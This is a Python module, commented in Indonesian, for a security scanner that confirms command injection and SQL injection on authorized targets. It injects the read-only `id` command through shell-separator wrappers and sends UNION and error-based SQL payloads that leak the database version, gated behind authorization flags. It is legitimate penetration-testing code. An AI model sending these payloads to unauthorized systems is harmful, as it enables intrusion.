"""Safe Proof-of-Concept — buktikan RCE & SQLi secara NYATA tanpa merusak.

Modul ini meniru cara `sqlmap` mengonfirmasi celah: bukan menebak, tapi
benar-benar mengeksekusi payload lalu memverifikasi hasilnya. Bedanya, semua
payload di sini JINAK dan READ-ONLY — tujuannya membuktikan eksekusi, bukan
mengambil alih server.

ATURAN KERAS (tidak boleh dilanggar):
  * Hanya jalan bila `config.authorized` DAN `config.poc` (flag --poc) aktif.
  * RCE: hanya jalankan perintah baca seperti `id` — TIDAK menulis file, TIDAK
    reverse shell, TIDAK download, TIDAK menanam apa pun.
  * SQLi: hanya membaca METADATA DB (versi) — TIDAK dump tabel, TIDAK ubah/hapus
    data.
  * Bukti hanya berupa nonce/marker/versi, bukan data sensitif korban.

Kalau celah terbukti, finding ditandai confidence="confirmed" (TERBUKTI) dengan
bukti konkret: payload yang dipakai + potongan output yang membuktikan eksekusi
server-side.
"""
from __future__ import annotations

import re

from cyberloka.active._helpers import candidate_urls, iter_param_urls
from cyberloka.core import Finding, HttpClient, Severity, Target
from cyberloka.core.config import ScanConfig
from cyberloka.core.util import truncate

# ---- RCE: perintah baca jinak + pola output yang mustahil muncul kebetulan ----
# Output `id` selalu berbentuk: uid=NNN(name) gid=NNN(name) ...
# Pola ini tidak pernah kita kirim sebagai payload, jadi kemunculannya = bukti
# server benar-benar mengeksekusi perintah.
ID_OUTPUT_RE = re.compile(r"uid=\d+\([\w.\-]+\)\s+gid=\d+")
RCE_WRAPPERS = (
    ";{cmd}", "|{cmd}", "||{cmd}", "&&{cmd}", "`{cmd}`", "$({cmd})", "\n{cmd}",
)
BENIGN_CMD = "id"  # read-only, tidak mengubah apa pun

# ---- SQLi: payload read-only yang HANYA membocorkan versi DB ------------------
# Marker unik di-concat dengan versi DB lewat 3 dialek (MySQL concat, Postgres /
# SQLite ||). Kemunculan "CYBERLOKADB~<versi>" = bukti SQL kita benar dieksekusi.
SQLI_MARKER = "CYBERLOKADB"
SQLI_PAYLOADS = (
    # error-based (MySQL/MariaDB) — versi bocor ke pesan error
    "' AND extractvalue(1,concat(0x7e,version()))-- -",
    "' AND updatexml(1,concat(0x7e,version()),1)-- -",
    "\" AND extractvalue(1,concat(0x7e,version()))-- -",
    # union marker-based, 1 kolom, 3 dialek concat
    "' UNION SELECT concat('CYBERLOKADB~',version())-- -",
    "' UNION SELECT 'CYBERLOKADB~'||version()-- -",
    "' UNION SELECT 'CYBERLOKADB~'||sqlite_version()-- -",
    # union marker-based, 2 kolom
    "' UNION SELECT NULL,concat('CYBERLOKADB~',version())-- -",
    "' UNION SELECT NULL,'CYBERLOKADB~'||sqlite_version()-- -",
    # konteks numeric / paren
    ") UNION SELECT 'CYBERLOKADB~'||sqlite_version()-- -",
)
MARKER_RE = re.compile(r"CYBERLOKADB~([^\s'\"<]+)")
XPATH_LEAK_RE = re.compile(r"XPATH syntax error: '~([^']+)'", re.I)
DB_VERSION_RE = re.compile(
    r"(MariaDB|MySQL|PostgreSQL|SQLite|Microsoft SQL Server|Oracle)[^\n<]{0,40}?"
    r"\d+\.\d+(?:\.\d+)?",
    re.I,
)


def _gated(config: ScanConfig) -> bool:
    return bool(getattr(config, "authorized", False) and getattr(config, "poc", False))


def _prove_rce(client: HttpClient, target: Target, config: ScanConfig) -> list[Finding]:
    findings: list[Finding] = []
    for url in candidate_urls(target, config, "cmd", "1"):
        for wrapper in RCE_WRAPPERS:
            injected = "x" + wrapper.format(cmd=BENIGN_CMD)
            for param, mutated in iter_param_urls(url, injected):
                resp = client.get(mutated)
                if resp is None:
                    continue
                m = ID_OUTPUT_RE.search(resp.text or "")
                if m:
                    findings.append(Finding(
                        module="safe_poc",
                        title=f"RCE TERBUKTI (Safe PoC) pada parameter `{param}`",
                        severity=Severity.CRITICAL,
                        description=(
                            "Safe PoC menyuntikkan perintah baca jinak `id` dan server "
                            "MENGEKSEKUSINYA — output `uid=...` yang muncul mustahil "
                            "berasal dari refleksi input. Ini bukti nyata Remote Code "
                            "Execution (tanpa payload merusak)."
                        ),
                        target=mutated,
                        evidence=truncate(
                            f"payload={injected!r}  ->  output server: {m.group(0)}", 240),
                        cwe="CWE-78",
                        confidence="confirmed",
                        remediation=(
                            "Jangan pernah meneruskan input user ke shell (`os.system`, "
                            "`subprocess(shell=True)`, `exec`). Pakai API argumen-list, "
                            "validasi whitelist, dan jalankan dengan privilege minimum."
                        ),
                        references=[
                            "https://owasp.org/www-community/attacks/Command_Injection",
                        ],
                        extra={"poc": "safe-rce", "command": BENIGN_CMD},
                    ))
                    return findings  # satu bukti per host cukup
    return findings


def _prove_sqli(client: HttpClient, target: Target, config: ScanConfig) -> list[Finding]:
    findings: list[Finding] = []
    for url in candidate_urls(target, config, "id", "1"):
        base = client.get(url)
        base_text = (base.text if base is not None else "") or ""
        base_has_version = bool(DB_VERSION_RE.search(base_text))
        for payload in SQLI_PAYLOADS:
            for param, mutated in iter_param_urls(url, payload):
                resp = client.get(mutated)
                if resp is None:
                    continue
                text = resp.text or ""
                version = None
                mk = MARKER_RE.search(text)  # bukti terkuat: marker unik kita
                if mk:
                    version = mk.group(1)
                if not version:
                    leak = XPATH_LEAK_RE.search(text)
                    if leak:
                        version = leak.group(1)
                if not version:
                    dv = DB_VERSION_RE.search(text)
                    if dv and not base_has_version:
                        version = dv.group(0)
                if version:
                    findings.append(Finding(
                        module="safe_poc",
                        title=f"SQL Injection TERBUKTI (Safe PoC) pada parameter `{param}`",
                        severity=Severity.CRITICAL,
                        description=(
                            "Safe PoC menyuntikkan query read-only untuk membaca versi "
                            "database, dan server mengembalikannya. Ini bukti SQL benar "
                            "dieksekusi (a la `sqlmap --banner`) — TANPA dump data "
                            "pelanggan."
                        ),
                        target=mutated,
                        evidence=truncate(
                            f"payload={payload!r}  ->  versi DB bocor: {version}", 240),
                        cwe="CWE-89",
                        confidence="confirmed",
                        remediation=(
                            "Pakai parameterized query / prepared statements untuk SEMUA "
                            "input. Jangan concatenate input ke SQL. Batasi privilege akun "
                            "DB aplikasi, dan sembunyikan pesan error dari user."
                        ),
                        references=[
                            "https://owasp.org/www-community/attacks/SQL_Injection",
                        ],
                        extra={"poc": "safe-sqli", "db_version": version},
                    ))
                    return findings
    return findings


def run(target: Target, config: ScanConfig) -> list[Finding]:
    if not _gated(config):
        # Diam total tanpa izin + opt-in. Tidak menebak, tidak menyentuh target.
        return []
    findings: list[Finding] = []
    client = HttpClient(config)
    try:
        findings.extend(_prove_rce(client, target, config))
        findings.extend(_prove_sqli(client, target, config))
    finally:
        client.close()
    return findings
